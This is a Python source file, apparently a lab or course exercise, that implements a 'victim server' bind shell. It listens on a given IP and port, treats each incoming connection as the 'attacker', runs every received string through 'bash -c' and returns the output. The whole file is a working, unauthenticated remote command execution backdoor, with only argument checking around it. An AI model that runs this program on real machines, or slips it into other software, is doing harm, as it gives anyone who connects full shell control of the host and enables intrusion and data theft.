import argparse
import socket
import sys
import subprocess
import threading

def execute_command(command):
    # output = subprocess.getoutput(command)
    result = subprocess.getoutput(f"bash -c '{command}'")
    return result

def handle_client_request(data, client_connection):
    print("recieved cmd: " + data)
    cmd_output = execute_command(data)
    if cmd_output == "":
        cmd_output = "Command " + data + " executed successfully, no output."
    try:
        client_connection.send(str.encode(cmd_output))
    except (BrokenPipeError, ConnectionResetError):
        print("Error: Attacker disconnected") 
    except OSError:
        pass
    print("output of " + data  + ": " + cmd_output)

def recieve_data(connected_socket):
    recieved_data = connected_socket.recv(1024)
    decoded_data =  recieved_data.decode("utf-8")
    handle_client_request(decoded_data, connected_socket)


def handle_client_connection(server_socket):
    conn, addr  = server_socket.accept()
    if conn:
        print("accepted attacker connection...")
    return conn
def validate_arguments(parsed_args):
    port_num = parsed_args.port_num
    ip_addr = parsed_args.ip_addr
    if(port_num < 0 or port_num > 65535):
        sys.exit("Error: Port number out of range must be between 0 - 65535")

    number_chunks_in_ip = ip_addr.split(".")
    if(len(number_chunks_in_ip) != 4 ):
        sys.exit("Error: Invalid IP address not enough dots should be 4!")
    
    for number in number_chunks_in_ip:

        if number.isalpha():
            sys.exit("Error: Invalid IP address contains a letter!")
        try:
            int(number)
        except:
            sys.exit("Error: Invalid IP address contains a character that isn't a number!")
        if int(number) > 255 or int(number) < 0:
            sys.exit("Error: Invalid IP address contains a number outside of te range of 0 to 255")

def parse_arguments():
    parser = argparse.ArgumentParser(prog=sys.argv[0])
    parser.add_argument("--ip-addr",type=str, required=True, help="ip address of this machine")
    parser.add_argument("--port-num",type=int, required=True, help="port number that machine will be listening on")
    args = parser.parse_args()
    return args

threads = [] 
client_sockets = []

def start_server(ip_addr, port_num):
    is_shutting_down = False
    connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        connection_socket.bind((ip_addr, port_num))
    except PermissionError:
        sys.exit("Permision denied! Use another port number!")
    except OSError as error:
        if error.errno == 98:
            sys.exit("Error: Address already in use")
    connection_socket.listen(10)
    try:
        while not is_shutting_down:
            new_connection = handle_client_connection(connection_socket)
            client_sockets.append(new_connection)
            receive_thread = threading.Thread(target=recieve_data, args=(new_connection,))
            receive_thread.start() 
            threads.append(receive_thread)
    except KeyboardInterrupt:
        is_shutting_down = True  # Set the shutdown flag
        connection_socket.close()  # Stop accepting new connections

        # Notify all clients that the server is disconnecting
        for client in client_sockets:
            try:
                client.send(str.encode("Error: Victim server disconnected"))
                client.close()  # Close the client socket
            except:
                pass  # Ignore errors if client already disconnected

        # Wait for all threads to finish before exiting
        for thread in threads:
            thread.join()
        sys.exit("\nServer disconnecting")

def main():
    parsed_args = parse_arguments()
    validate_arguments(parsed_args)
    port_num = parsed_args.port_num
    ip_addr = parsed_args.ip_addr
    print("Victim server starting")
    start_server(ip_addr, port_num)
main()